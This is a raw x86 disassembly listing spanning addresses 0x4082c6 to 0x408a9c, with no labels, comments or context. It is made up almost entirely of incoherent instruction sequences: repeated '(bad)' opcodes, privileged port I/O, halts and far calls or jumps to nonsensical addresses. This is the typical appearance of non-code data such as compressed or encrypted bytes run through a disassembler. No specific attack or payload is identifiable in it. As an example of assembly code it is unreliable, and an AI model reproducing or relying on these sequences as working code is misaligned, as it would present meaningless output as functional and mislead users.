  4082c6:	sub    BYTE PTR [esi+esi*2+0x17],al
  4082ca:	add    BYTE PTR [ecx],0x80
  4082cd:	mov    WORD PTR [edx-0x8c650e2],es
  4082d3:	dec    ebp
  4082d4:	ds mov al,0x90
  4082d7:	and    BYTE PTR [ebx],al
  4082d9:	mov    esi,0xfd541867
  4082de:	sub    ebx,esi
  4082e0:	cmp    ecx,DWORD PTR [esi-0x4c14c347]
  4082e6:	mov    esi,0x8a541fc0
  4082eb:	push   0xffffff91
  4082ed:	hlt    
  4082ee:	in     eax,dx
  4082ef:	cmp    al,0x1
  4082f1:	mov    ah,0x3a
  4082f3:	xchg   bh,bl
  4082f5:	mov    ds:0x78f1e729,eax
  4082fa:	ror    cl,0xc8
  4082fd:	or     al,bl
  4082ff:	adc    DWORD PTR [esi-0x5e],edi
  408302:	mov    ebp,0x70c3f7c8
  408307:	pop    ss
  408308:	aam    0x8
  40830a:	int    0x23
  40830c:	lahf   
  40830d:	rol    BYTE PTR [esp+ebx*1+0x8276709],1
  408314:	xor    dh,0xed
  408317:	call   0xd631cb1f
  40831c:	or     DWORD PTR [ecx-0x57],esp
  40831f:	call   0x43ef66cb
  408324:	xchg   ebx,eax
  408325:	sbb    DWORD PTR [edi+ebx*2+0x40],0x53b50c41
  40832d:	popa   
  40832e:	push   ss
  40832f:	imul   esp,DWORD PTR [ebp-0x42],0xffffffd1
  408333:	sbb    BYTE PTR ds:0xed518d9d,bh
  408339:	dec    edx
  40833a:	sahf   
  40833b:	adc    esi,ecx
  40833d:	or     eax,0xdc48278
  408342:	sar    edi,1
  408344:	js     0x4082f3
  408346:	dec    esi
  408347:	mov    ebp,0x41868261
  40834c:	(bad)  
  40834d:	ret    0x3573
  408350:	pusha  
  408351:	lds    eax,FWORD PTR [eax]
  408353:	ss sbb ch,cl
  408356:	sub    eax,0x8fa2c497
  40835b:	push   0x59bf6bca
  408360:	jno    0x408305
  408362:	jg     0x4083bb
  408364:	pusha  
  408365:	cmp    al,0xfe
  408367:	or     bh,BYTE PTR [ebx]
  408369:	data16 ror BYTE PTR [ebx+eax*8-0x56],1
  40836e:	dec    edi
  40836f:	pop    ebp
  408370:	lahf   
  408371:	(bad)  
  408372:	fild   DWORD PTR [eax+0x7d]
  408375:	mov    bh,0x19
  408377:	mov    ebx,ecx
  408379:	pushf  
  40837a:	cmp    eax,0xbf1b8ece
  40837f:	lock lods al,BYTE PTR ds:[esi]
  408381:	and    esp,DWORD PTR [eax-0x3e9b81d3]
  408387:	mov    DWORD PTR [ebx+eiz*1],ecx
  40838a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838b:	loopne 0x408389
  40838d:	in     eax,0x53
  40838f:	aad    0xc
  408391:	out    dx,eax
  408392:	dec    ebp
  408393:	mov    ebp,0xbd20cb14
  408398:	fcomp  QWORD PTR [edx]
  40839a:	add    eax,0x4a924f12
  40839f:	fwait
  4083a0:	add    ebp,DWORD PTR [ebx-0x2a]
  4083a3:	lahf   
  4083a4:	push   ecx
  4083a5:	cld    
  4083a6:	push   esi
  4083a7:	pop    ds
  4083a8:	add    bl,bh
  4083aa:	sub    al,0xa
  4083ac:	push   edi
  4083ad:	scas   eax,DWORD PTR es:[edi]
  4083ae:	push   ds
  4083af:	jno    0x4083fe
  4083b1:	leave  
  4083b2:	fst    QWORD PTR [ebp+0x4c509081]
  4083b8:	in     al,dx
  4083b9:	push   ebx
  4083ba:	jmp    0x4083f8
  4083bc:	jmp    edx
  4083be:	inc    ebp
  4083bf:	jmp    0xf9bb:0x73272c9e
  4083c6:	xor    BYTE PTR [eax-0x49],0xf5
  4083ca:	mov    ebx,DWORD PTR [eax-0x419f7e17]
  4083d0:	cwde   
  4083d1:	data16 jnp 0x40843b
  4083d4:	sub    DWORD PTR [edx],0x23629834
  4083da:	popa   
  4083db:	adc    al,0x63
  4083dd:	mov    ebp,0x492a1822
  4083e2:	cmp    al,0x20
  4083e4:	push   ds
  4083e5:	cmp    BYTE PTR gs:[ebp+ecx*8+0x1a],0xc9
  4083eb:	ror    DWORD PTR ds:0x3f030684,0xe6
  4083f2:	lds    eax,FWORD PTR [ecx+edi*4+0x36]
  4083f6:	int3   
  4083f7:	xor    esi,DWORD PTR [esi+edx*1+0x57]
  4083fb:	mov    edi,0xc090843
  408400:	pop    es
  408401:	mov    bh,0xbf
  408403:	mov    al,0xaf
  408405:	stos   BYTE PTR es:[edi],al
  408406:	fnsave [eax+0x3e]
  408409:	int3   
  40840a:	mov    dl,0x75
  40840c:	dec    ebx
  40840d:	(bad)  
  40840e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40840f:	sar    edi,0x84
  408412:	cs sub al,0x77
  408415:	retf   
  408416:	dec    edx
  408417:	leave  
  408418:	jo     0x4083c7
  40841a:	sub    ah,cl
  40841c:	fwait
  40841d:	jae    0x408437
  40841f:	cdq    
  408420:	mov    ds:0x3e8783f3,al
  408425:	outs   dx,DWORD PTR cs:[esi]
  408427:	in     al,dx
  408428:	xchg   ebp,eax
  408429:	cs iret 
  40842b:	sub    bl,BYTE PTR [ecx+0x5c38f7b1]
  408431:	ins    BYTE PTR es:[edi],dx
  408432:	xor    DWORD PTR [edx+0x3828671f],ebp
  408438:	or     dl,BYTE PTR [esi+0x42ec4a0a]
  40843e:	pop    es
  40843f:	dec    eax
  408440:	lods   al,BYTE PTR ds:[esi]
  408441:	jb     0x4083c6
  408443:	loop   0x408480
  408445:	push   ds
  408446:	mov    bl,0x63
  408448:	pop    esp
  408449:	xor    dl,BYTE PTR [edi+0x600e1c27]
  40844f:	push   eax
  408450:	pushf  
  408451:	mov    DWORD PTR [ebx+0x5f0fd77b],ebx
  408457:	std    
  408458:	pop    esi
  408459:	and    esp,ebp
  40845b:	add    cl,al
  40845d:	shl    DWORD PTR [ebp+0x14eee44c],cl
  408463:	push   ds
  408464:	out    dx,al
  408465:	fwait
  408466:	add    ebp,DWORD PTR [ebp+0x7c]
  408469:	iret   
  40846a:	xchg   esp,eax
  40846b:	loope  0x408450
  40846d:	sbb    eax,0x5179147b
  408472:	loopne 0x4084dc
  408474:	dec    eax
  408475:	push   0xffffffcc
  408477:	mov    ch,0xda
  408479:	ret    0x4330
  40847c:	out    dx,eax
  40847d:	ja     0x4084fe
  40847f:	mov    ecx,0x63fb58a4
  408484:	push   ss
  408485:	mov    ecx,0xeb93b3d1
  40848a:	mov    ebx,0x259c3f80
  40848f:	xor    BYTE PTR [esi+0x3e],ah
  408492:	out    dx,al
  408493:	mov    edx,0xd4cee049
  408498:	xchg   dh,dh
  40849a:	adc    bl,ah
  40849c:	sbb    ebp,DWORD PTR [esi]
  40849e:	inc    ebx
  40849f:	out    0x82,al
  4084a1:	jmp    0x1b12231f
  4084a6:	push   ds
  4084a7:	and    DWORD PTR [ebp-0xa],ecx
  4084aa:	xchg   edi,eax
  4084ab:	push   ecx
  4084ac:	push   0x7b
  4084ae:	sub    bl,BYTE PTR [edx+0x5c]
  4084b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b2:	retf   0x5c07
  4084b5:	pop    eax
  4084b6:	nop
  4084b7:	push   es
  4084b8:	das    
  4084b9:	rcr    DWORD PTR [edi],cl
  4084bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084bc:	aas    
  4084bd:	aas    
  4084be:	jnp    0x4084ff
  4084c0:	mov    eax,DWORD PTR [ebp-0x2dbb1b98]
  4084c6:	(bad)  
  4084c7:	(bad)
  4084cb:	xchg   esi,eax
  4084cc:	dec    edi
  4084cd:	es ins BYTE PTR es:[edi],dx
  4084cf:	ins    DWORD PTR es:[edi],dx
  4084d0:	retf   0xeafd
  4084d3:	pop    eax
  4084d4:	int3   
  4084d5:	or     ebp,DWORD PTR [esi-0x13301b5a]
  4084db:	imul   edx,DWORD PTR [esi+0x5caa8a4a],0x4e
  4084e2:	add    al,0xb6
  4084e4:	pop    esp
  4084e5:	and    eax,0x855f821c
  4084ea:	mov    esi,0x7657b79c
  4084ef:	fistp  DWORD PTR [edi-0x3d]
  4084f2:	imul   ebp,DWORD PTR [edx-0x21d6a036],0x31
  4084f9:	popa   
  4084fa:	and    BYTE PTR [edi-0x6a71ef1f],dh
  408500:	and    ebp,DWORD PTR [ebp+0x5fae845e]
  408506:	shl    DWORD PTR [esi],cl
  408508:	icebp  
  408509:	mov    ch,0x4a
  40850b:	call   0xe80f:0x135a8bcf
  408512:	sar    DWORD PTR [esi-0x6b5525b9],cl
  408518:	inc    ebx
  408519:	jmp    0xeb4f68dc
  40851e:	adc    BYTE PTR [ebx-0x6c5c7dc6],cl
  408524:	outs   dx,DWORD PTR ds:[esi]
  408525:	xchg   edx,eax
  408526:	and    al,0x9c
  408528:	mov    edx,0x6022abe9
  40852d:	imul   esi,DWORD PTR [esi-0x23],0xffffffe7
  408531:	xor    BYTE PTR es:[edx+eiz*4-0x7],ah
  408536:	loopne 0x4084fa
  408538:	iret   
  408539:	out    0x46,al
  40853b:	fisub  WORD PTR [ecx-0x78e4ec56]
  408541:	xor    eax,0x7fdc2213
  408546:	sub    edx,DWORD PTR [esi-0x21]
  408549:	push   esi
  40854a:	scas   eax,DWORD PTR es:[edi]
  40854b:	inc    ecx
  40854c:	(bad)  
  40854d:	test   al,0x1c
  40854f:	ds jmp 0x4085c8
  408552:	xchg   DWORD PTR [edi-0x68],esp
  408555:	pop    ss
  408556:	sbb    eax,0x424017f2
  40855b:	test   al,0xff
  40855d:	ror    esi,cl
  40855f:	in     al,dx
  408560:	and    al,0x79
  408562:	dec    eax
  408563:	dec    ebp
  408564:	stos   DWORD PTR es:[edi],eax
  408565:	imul   ebp,esp,0x7b
  408568:	sub    al,0xc5
  40856a:	sbb    bl,BYTE PTR [ecx]
  40856c:	mov    ebx,0x4f0a9120
  408571:	inc    eax
  408572:	popa   
  408573:	out    dx,eax
  408574:	sub    DWORD PTR ds:0x32e61fc1,0x31569210
  40857e:	(bad)  
  40857f:	popa   
  408580:	jo     0x408563
  408582:	xchg   edx,eax
  408583:	cmp    DWORD PTR [ecx],0x18aad4c0
  408589:	(bad)  
  40858a:	std    
  40858b:	pop    ds
  40858c:	xchg   ebx,eax
  40858d:	outs   dx,DWORD PTR ds:[esi]
  40858e:	fxch   st(7)
  408590:	xor    eax,0x19d7aeb4
  408595:	fsubr  QWORD PTR [eax]
  408597:	outs   dx,BYTE PTR ds:[si]
  408599:	cmp    cl,BYTE PTR [esi-0x32]
  40859c:	jl     0x40860c
  40859e:	xor    eax,0x3cc5a9de
  4085a3:	retf   
  4085a4:	bound  ebx,QWORD PTR [ecx+0x14]
  4085a7:	xor    ch,BYTE PTR [esi-0x11]
  4085aa:	inc    edi
  4085ab:	pop    es
  4085ac:	and    BYTE PTR [ecx+0x39],0xd6
  4085b0:	and    eax,DWORD PTR [ebp+edi*4-0x1c]
  4085b4:	rcl    DWORD PTR ds:0x6bfebed0,1
  4085ba:	xchg   edx,eax
  4085bb:	lods   eax,DWORD PTR ds:[esi]
  4085bc:	pushf  
  4085bd:	or     eax,0xc75ea5d9
  4085c2:	scas   eax,DWORD PTR es:[edi]
  4085c3:	nop
  4085c4:	retf   
  4085c5:	pop    ebx
  4085c6:	dec    eax
  4085c7:	jle    0x4085fd
  4085c9:	push   ss
  4085ca:	jmp    0x4085a0
  4085cc:	stc    
  4085cd:	and    al,bh
  4085cf:	mov    ebp,0x62c1c339
  4085d4:	(bad)  
  4085d6:	shl    edx,1
  4085d8:	push   ss
  4085d9:	sbb    al,0x5a
  4085db:	ins    BYTE PTR es:[edi],dx
  4085dc:	cmp    DWORD PTR [edi],0x7a
  4085df:	push   edi
  4085e0:	pop    esi
  4085e1:	fs adc eax,0xe20cd45c
  4085e7:	inc    ebp
  4085e8:	aam    0xf6
  4085ea:	loopne 0x40862d
  4085ec:	clc    
  4085ed:	xchg   ecx,eax
  4085ee:	jns    0x40863e
  4085f0:	jo     0x4085dd
  4085f2:	cmp    bl,BYTE PTR [ebx+0x6501c35b]
  4085f8:	and    eax,0xa04547ff
  4085fd:	shl    DWORD PTR ds:0x825e8c35,0xe3
  408604:	inc    edi
  408605:	sbb    esp,esi
  408607:	call   0xff18:0xf952387e
  40860e:	add    eax,0x1060307f
  408613:	out    dx,eax
  408614:	ror    DWORD PTR [esi+0x15d2f7af],0xfa
  40861b:	push   ebp
  40861c:	add    eax,0xf412e9c
  408621:	out    0xb2,al
  408623:	mov    bh,0x9e
  408625:	xor    eax,0x199cd63
  40862a:	in     eax,dx
  40862b:	xor    BYTE PTR [ebx],0xcd
  40862e:	(bad)  
  40862f:	(bad)  
  408630:	jmp    0x40867a
  408632:	add    eax,esp
  408634:	mov    BYTE PTR [ecx+0x6a],bh
  408637:	or     eax,0x36700bb1
  40863c:	cwde   
  40863d:	dec    ecx
  40863e:	adc    ax,WORD PTR [edi]
  408641:	mov    ch,0x77
  408643:	add    BYTE PTR [ecx+0x7e],ah
  408646:	xor    dh,al
  408648:	sub    dh,ah
  40864a:	loopne 0x4085fe
  40864c:	jecxz  0x408681
  40864e:	jmp    0x408606
  408650:	sub    dl,BYTE PTR [ebx-0x5ecb8289]
  408656:	cmp    DWORD PTR [ebp+0x1e],esp
  408659:	sbb    BYTE PTR [eax+ebp*8-0x5e],bl
  40865d:	popa   
  40865e:	adc    al,0xcd
  408660:	dec    edi
  408661:	push   ds
  408662:	in     al,0x3e
  408664:	dec    eax
  408665:	(bad)  
  408666:	jmp    0x66e61983
  40866b:	(bad)  
  40866c:	cdq    
  40866d:	jge    0x4086de
  40866f:	pop    ebx
  408670:	and    DWORD PTR [ecx],esi
  408672:	and    BYTE PTR [esi-0x728641b1],cl
  408678:	cmp    BYTE PTR [eax+eiz*1+0x3c],0xb5
  40867d:	loope  0x40862c
  40867f:	push   ebx
  408680:	(bad)  
  408681:	jae    0x408646
  408683:	das    
  408684:	rcr    BYTE PTR [ebx],cl
  408686:	xchg   ecx,eax
  408687:	jecxz  0x4086f1
  408689:	sub    al,dh
  40868b:	enter  0x9602,0xdb
  40868f:	fsubr  st,st(6)
  408691:	adc    al,0xc4
  408693:	pop    edx
  408694:	jns    0x4086ec
  408696:	call   0x88c5ca5e
  40869b:	adc    ebp,DWORD PTR [eax-0x2ad3d107]
  4086a1:	aas    
  4086a2:	into   
  4086a3:	sar    eax,0x91
  4086a6:	pusha  
  4086a7:	xchg   ebp,eax
  4086a8:	push   edx
  4086a9:	push   edx
  4086aa:	push   0x51
  4086ac:	ja     0x4086d8
  4086ae:	ror    BYTE PTR [ebp-0x3e],0xaa
  4086b2:	or     bl,BYTE PTR [edx-0x6e49b4ee]
  4086b8:	out    0xa3,al
  4086ba:	push   edx
  4086bb:	jmp    0x4086ee
  4086bd:	or     dh,BYTE PTR [edi]
  4086bf:	adc    al,0xed
  4086c1:	sahf   
  4086c2:	jl     0x4086e7
  4086c4:	test   cl,cl
  4086c6:	into   
  4086c7:	pop    eax
  4086c8:	fdivp  st(0),st
  4086ca:	xchg   ecx,eax
  4086cb:	hlt    
  4086cc:	scas   eax,DWORD PTR es:[edi]
  4086cd:	and    edi,DWORD PTR ds:0x769bdbaa
  4086d3:	icebp  
  4086d4:	inc    edx
  4086d5:	push   ecx
  4086d6:	pusha  
  4086d7:	dec    ecx
  4086d8:	mov    dh,0x83
  4086da:	xchg   ebp,eax
  4086db:	sbb    eax,0x7f33112f
  4086e0:	nop
  4086e1:	stos   BYTE PTR es:[edi],al
  4086e2:	pusha  
  4086e3:	sbb    bl,BYTE PTR es:[edi-0x5a0d5373]
  4086ea:	mov    ds:0x56153b6a,eax
  4086ef:	mov    bh,0x6e
  4086f1:	and    dh,BYTE PTR [eax+0x5a]
  4086f4:	sbb    ebp,DWORD PTR [esp+ecx*1]
  4086f7:	push   edi
  4086f8:	cmc    
  4086f9:	popa   
  4086fa:	aaa    
  4086fb:	(bad)  
  4086fc:	xchg   edx,eax
  4086fd:	nop
  4086fe:	js     0x4086c9
  408700:	xchg   ebx,eax
  408701:	adc    ah,BYTE PTR [edx-0x55]
  408704:	inc    eax
  408705:	loope  0x408766
  408707:	jmp    DWORD PTR [esp+ebp*4]
  40870a:	fadd   DWORD PTR [ebx+0x1d]
  40870d:	xor    BYTE PTR [edx],al
  40870f:	inc    edi
  408710:	js     0x4086f7
  408712:	ds cmc 
  408714:	jae    0x4086b1
  408716:	clc    
  408717:	pop    ebx
  408718:	iret   
  408719:	sbb    eax,0x13c77c78
  40871e:	xchg   ecx,eax
  40871f:	test   al,0x90
  408721:	inc    esi
  408722:	fwait
  408723:	pop    ebx
  408724:	stos   DWORD PTR es:[edi],eax
  408725:	push   ds
  408726:	push   cs
  408727:	ret    0xb27f
  40872a:	aaa    
  40872b:	in     eax,dx
  40872c:	enter  0xac50,0xe6
  408730:	cdq    
  408731:	jmp    0xe4b3ffc
  408736:	leave  
  408737:	fs ins BYTE PTR es:[edi],dx
  408739:	xor    dl,BYTE PTR [edi-0x56]
  40873c:	sbb    edi,DWORD PTR [edx]
  40873e:	das    
  40873f:	jl     0x4087b6
  408741:	aaa    
  408742:	push   ebp
  408743:	push   eax
  408744:	(bad)  
  408745:	nop
  408746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408747:	xchg   ah,bl
  408749:	push   ecx
  40874a:	aaa    
  40874b:	push   esp
  40874c:	adc    DWORD PTR [eax+0x468a2657],ebp
  408752:	sbb    esp,ebx
  408754:	fst    st(7)
  408756:	das    
  408757:	je     0x4087a6
  408759:	call   0x690fd2e4
  40875e:	cs inc esi
  408760:	dec    esp
  408761:	push   es
  408762:	ins    DWORD PTR es:[edi],dx
  408763:	sar    DWORD PTR [edi],1
  408765:	adc    DWORD PTR [esi+0x5b],esi
  408768:	add    al,0xc0
  40876a:	inc    ecx
  40876b:	dec    edi
  40876c:	cwde   
  40876d:	in     al,0xcb
  40876f:	repnz and al,0xfe
  408772:	int    0xb1
  408774:	sbb    al,0xae
  408777:	jno    0x40870b
  408779:	pop    eax
  40877a:	jle    0x40875a
  40877c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40877d:	repz xchg esp,eax
  40877f:	xchg   ecx,eax
  408780:	or     al,0xca
  408782:	fs push ss
  408784:	push   0x4c
  408786:	test   DWORD PTR [esi-0x71d331d0],esp
  40878c:	iret   
  40878d:	mov    dl,0x5d
  40878f:	and    al,0xd0
  408791:	adc    DWORD PTR [ebx-0x5b],esi
  408794:	call   0x981e:0x705608a5
  40879b:	not    ecx
  40879d:	add    BYTE PTR [edx-0x33491c08],ah
  4087a3:	fcom   DWORD PTR [edx+ebx*8]
  4087a6:	xor    dl,BYTE PTR [edi+0x69e7dcd8]
  4087ac:	loop   0x408783
  4087ae:	mov    edx,0xafaff0e4
  4087b3:	mov    ebx,DWORD PTR [ebp+0xa]
  4087b6:	mov    bh,0xcd
  4087b8:	pop    es
  4087b9:	push   eax
  4087ba:	loopne 0x408812
  4087bc:	pop    ss
  4087bd:	and    al,BYTE PTR [edx]
  4087bf:	into   
  4087c0:	(bad)
  4087c3:	and    BYTE PTR [ecx+0xc653fd],al
  4087c9:	(bad)  
  4087ca:	pop    ebx
  4087cb:	pop    ecx
  4087cc:	ficom  WORD PTR ds:0xba9346b
  4087d2:	ror    bl,0x39
  4087d5:	xor    al,0xec
  4087d7:	jb     0x4087ee
  4087d9:	in     al,dx
  4087da:	out    dx,eax
  4087db:	fistp  QWORD PTR gs:[ecx+0x13901a8]
  4087e2:	shr    esi,cl
  4087e4:	ins    DWORD PTR es:[edi],dx
  4087e5:	adc    al,0xb2
  4087e7:	sub    BYTE PTR [ebp+eax*2+0x3fb18d07],ah
  4087ee:	push   ebp
  4087ef:	dec    edx
  4087f0:	les    ebx,FWORD PTR [esi+0x6a]
  4087f3:	mov    ecx,0xffbf9f6c
  4087f8:	adc    DWORD PTR [ebx+0x4c82026e],edi
  4087fe:	jb     0x4087d9
  408800:	push   esi
  408801:	iret   
  408802:	iret   
  408803:	pop    esp
  408804:	dec    eax
  408805:	mov    esi,DWORD PTR [edx]
  408807:	call   0xd5ff7d99
  40880c:	xchg   esp,eax
  40880d:	cs dec edi
  40880f:	outs   dx,DWORD PTR ds:[esi]
  408810:	xchg   ebx,eax
  408811:	pusha  
  408812:	push   ecx
  408813:	jmp    0x60f30f53
  408818:	push   esp
  408819:	clc    
  40881a:	enter  0x6db5,0xfc
  40881e:	retf   0x1342
  408821:	ucomiss xmm0,DWORD PTR [eax-0x719bb9d1]
  408828:	mov    bh,0xd6
  40882a:	inc    ebp
  40882b:	call   0x9da80f41
  408830:	mov    BYTE PTR [edi+esi*2+0x717f431c],ch
  408837:	pop    esp
  408838:	xor    cl,dh
  40883a:	aaa    
  40883b:	mov    eax,0xd04e2aa5
  408840:	in     al,0xe8
  408842:	cmp    DWORD PTR [ecx-0x55],edx
  408845:	loope  0x40881b
  408847:	push   ecx
  408848:	int    0x90
  40884a:	lods   eax,DWORD PTR ds:[esi]
  40884b:	mov    ecx,0x9a0332d8
  408850:	jb     0x4088c3
  408852:	jmp    0x57bdab71
  408857:	xchg   esp,eax
  408858:	cwde   
  408859:	pusha  
  40885a:	enter  0x2c97,0xca
  40885e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885f:	xchg   edx,eax
  408860:	aas    
  408861:	sbb    esp,edx
  408863:	inc    esi
  408864:	sbb    BYTE PTR [edx],cl
  408866:	loop   0x4088d2
  408868:	fisub  DWORD PTR ds:0x5520c3be
  40886e:	fs jo  0x4087fa
  408871:	pop    edi
  408872:	les    esi,FWORD PTR [ebp+0x4b79c05f]
  408878:	push   es
  408879:	fidiv  WORD PTR [edi]
  40887b:	ss sti 
  40887d:	sbb    BYTE PTR [esi+eax*1+0x6c],bh
  408881:	add    al,0x27
  408883:	inc    esi
  408884:	fcmovnbe st,st(3)
  408886:	inc    edx
  408887:	je     0x4088c7
  408889:	pushf  
  40888a:	add    ah,dh
  40888c:	rcr    esp,cl
  40888e:	dec    eax
  40888f:	fild   WORD PTR [edx]
  408891:	ins    DWORD PTR es:[edi],dx
  408892:	inc    ebx
  408893:	or     DWORD PTR [ecx+0x5c0249bb],edx
  408899:	repnz and eax,0xba3e0b45
  40889f:	loope  0x4088c8
  4088a1:	xor    eax,0xa498432c
  4088a6:	std    
  4088a7:	jge    0x4088c7
  4088a9:	stos   DWORD PTR es:[edi],eax
  4088aa:	jae    0x408854
  4088ac:	jecxz  0x40883d
  4088ae:	psubw  mm1,QWORD PTR [ecx+0x71]
  4088b2:	ret    
  4088b3:	or     BYTE PTR [eax+edx*8+0xb],al
  4088b7:	pusha  
  4088b8:	loop   0x40885f
  4088ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088bb:	test   eax,0xa7994921
  4088c0:	mov    WORD PTR [edx-0x2de88616],ss
  4088c6:	xchg   ebx,eax
  4088c7:	sbb    bh,al
  4088c9:	sub    bh,BYTE PTR [edx-0xbc0c529]
  4088cf:	int    0x5d
  4088d1:	outs   dx,BYTE PTR ds:[esi]
  4088d2:	jnp    0x40894c
  4088d4:	arpl   WORD PTR [esi],si
  4088d6:	xchg   esp,eax
  4088d7:	mov    cl,0xbd
  4088d9:	pop    ss
  4088da:	sti    
  4088db:	test   al,0x4a
  4088dd:	sub    ah,BYTE PTR [esi]
  4088df:	cmp    eax,0x63a8e011
  4088e4:	jp     0x4088d5
  4088e6:	mov    al,0xb3
  4088e8:	div    bl
  4088ea:	scas   al,BYTE PTR es:[edi]
  4088eb:	xor    eax,0x928cdd
  4088f0:	aam    0x78
  4088f2:	lds    eax,FWORD PTR [ebx+esi*1-0x4b]
  4088f6:	fstp   QWORD PTR [edx+eax*4]
  4088f9:	pop    esi
  4088fa:	mov    cs,WORD PTR [eax+0x370c09bb]
  408900:	mov    BYTE PTR [ecx+eax*8+0x114046f9],dh
  408907:	into   
  408908:	ret    0x8559
  40890b:	pop    ebp
  40890c:	jecxz  0x408983
  40890e:	sbb    dh,BYTE PTR [eax-0x59]
  408911:	mov    esp,DWORD PTR [ecx-0xa]
  408914:	in     eax,0x14
  408916:	pop    ebp
  408917:	in     al,dx
  408918:	fisub  DWORD PTR [ebx+ebx*2+0x57]
  40891c:	jne    0x408935
  40891e:	jecxz  0x4088f6
  408920:	adc    DWORD PTR [ecx],edi
  408922:	xchg   edi,eax
  408923:	jmp    0x4088d4
  408925:	mul    edx
  408927:	aad    0x35
  408929:	in     eax,0x80
  40892b:	ret    0x4fa7
  40892e:	test   eax,0xe36cf6d7
  408933:	inc    esp
  408934:	aam    0x4c
  408936:	cmp    bl,BYTE PTR [edi]
  408938:	jb     0x408976
  40893a:	mov    bh,0xb0
  40893c:	sbb    DWORD PTR cs:[ebp-0x589c2136],esp
  408943:	mov    ecx,0x6fed3e3e
  408948:	call   0x629b:0x2f19180
  40894f:	inc    ebx
  408950:	jle    0x408945
  408952:	addr16 mov dl,0x16
  408955:	pop    ss
  408956:	jno    0x408964
  408958:	mov    gs,WORD PTR [eax]
  40895a:	pop    edi
  40895b:	and    eax,0xf1aee419
  408960:	nop
  408961:	pop    ebx
  408962:	enter  0x21df,0x58
  408966:	xchg   ebp,eax
  408967:	or     ebp,0x6acc0fb9
  40896d:	stos   BYTE PTR es:[edi],al
  40896e:	mov    al,fs:0xa287a97
  408974:	xchg   esp,eax
  408975:	mov    al,0x96
  408977:	inc    esi
  408978:	sbb    ch,BYTE PTR [edi-0xe]
  40897b:	cli    
  40897c:	jecxz  0x40890c
  40897e:	out    dx,al
  40897f:	or     edi,esp
  408981:	sbb    bl,bl
  408983:	loop   0x408926
  408985:	mov    eax,0x662ad902
  40898a:	jmp    0x17d4cfd4
  40898f:	hlt    
  408990:	mov    bh,0xae
  408992:	or     cl,BYTE PTR [ebx]
  408994:	test   DWORD PTR [edx],esp
  408996:	cmp    bh,BYTE PTR [esi+0x49483de]
  40899c:	scas   eax,DWORD PTR es:[edi]
  40899d:	add    BYTE PTR [esi-0x26],bh
  4089a0:	xor    DWORD PTR [ecx],ebx
  4089a2:	call   0xf50ae4c7
  4089a7:	sub    ecx,DWORD PTR [ecx-0x4a1ae03e]
  4089ad:	sub    ah,BYTE PTR [edi+0x1]
  4089b0:	mov    edx,0x17f8ad38
  4089b5:	sub    edi,DWORD PTR [ebp+0x35e63591]
  4089bb:	and    eax,0x8e260be4
  4089c0:	arpl   WORD PTR [eax],ax
  4089c2:	mov    ch,0x24
  4089c4:	adc    esi,DWORD PTR [edx-0x7e]
  4089c7:	pop    ebx
  4089c8:	pop    es
  4089c9:	adc    al,0xc2
  4089cb:	mov    bh,0x4b
  4089cd:	lods   eax,DWORD PTR ds:[esi]
  4089ce:	push   ebp
  4089cf:	shl    DWORD PTR [ebp+0x73],cl
  4089d2:	jl     0x4089e5
  4089d4:	in     eax,dx
  4089d5:	(bad)  
  4089d6:	iret   
  4089d7:	into   
  4089d8:	mov    dl,0xb4
  4089da:	pop    eax
  4089db:	fcmovb st,st(4)
  4089dd:	jp     0x408a2e
  4089df:	ret    
  4089e0:	cwde   
  4089e1:	dec    ecx
  4089e2:	fsub   DWORD PTR [edx]
  4089e4:	arpl   WORD PTR [ecx],ax
  4089e6:	adc    DWORD PTR [ecx-0x7],edx
  4089e9:	call   0x7dad:0xd225b7c0
  4089f0:	test   eax,0xc2c2e9ae
  4089f5:	cmp    al,0x36
  4089f7:	dec    ebp
  4089f8:	mov    esp,0x1ca630ce
  4089fd:	lahf   
  4089fe:	neg    DWORD PTR [eax-0x42]
  408a01:	cmp    al,0x75
  408a03:	and    esp,DWORD PTR [ebx]
  408a05:	adc    ecx,DWORD PTR [edx]
  408a07:	mov    dh,0xe7
  408a09:	stc    
  408a0a:	inc    ebx
  408a0b:	adc    dl,dh
  408a0d:	or     BYTE PTR [eax-0x5db38279],al
  408a13:	adc    DWORD PTR [eax+0x6],esp
  408a16:	rol    DWORD PTR [ebp-0x68],0x2d
  408a1a:	imul   eax,ebp,0x553cf023
  408a20:	stos   DWORD PTR es:[edi],eax
  408a21:	pop    esp
  408a22:	xchg   edi,eax
  408a23:	call   0xc73a2b09
  408a28:	sub    al,0x5f
  408a2a:	sahf   
  408a2b:	pop    ds
  408a2c:	ror    cl,0x58
  408a2f:	mov    ecx,0xedfa0548
  408a34:	cld    
  408a35:	ins    BYTE PTR es:[edi],dx
  408a36:	sub    esi,DWORD PTR [ebx+0x43a99465]
  408a3c:	jg     0x408aa7
  408a3e:	(bad)  
  408a3f:	rol    BYTE PTR [eax+0x46],0xdc
  408a43:	test   DWORD PTR [edx+0x6cf2e9ed],0x6a66fa3a
  408a4d:	bound  esp,QWORD PTR [ebp-0x14a66a6d]
  408a53:	mov    ds:0xfb870533,eax
  408a58:	mov    ah,0x53
  408a5a:	xchg   dl,al
  408a5c:	enter  0x4d28,0x2b
  408a60:	sub    ah,BYTE PTR [esi]
  408a62:	sub    BYTE PTR [esp+esi*1+0x6a7c5e3],dl
  408a69:	jmp    0x9384d8f8
  408a6e:	jl     0x408a11
  408a70:	fwait
  408a71:	mov    WORD PTR [esp+edi*4-0x4],fs
  408a75:	mov    bl,0xfc
  408a77:	iret   
  408a78:	mov    edi,0x1e3c9951
  408a7d:	jb     0x408a73
  408a7f:	push   eax
  408a80:	adc    BYTE PTR [ebx],dh
  408a82:	or     DWORD PTR [ecx-0x55],0x3d563066
  408a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a8a:	sub    DWORD PTR [eax+0x5aacc6a1],ebp
  408a90:	inc    edx
  408a91:	push   cs
  408a92:	popf   
  408a93:	push   0xdefd00a2
  408a98:	(bad)  
  408a99:	push   eax
  408a9a:	(bad)  
  408a9c:	les    eax,FWORD PTR [esi-0x97a7faa]
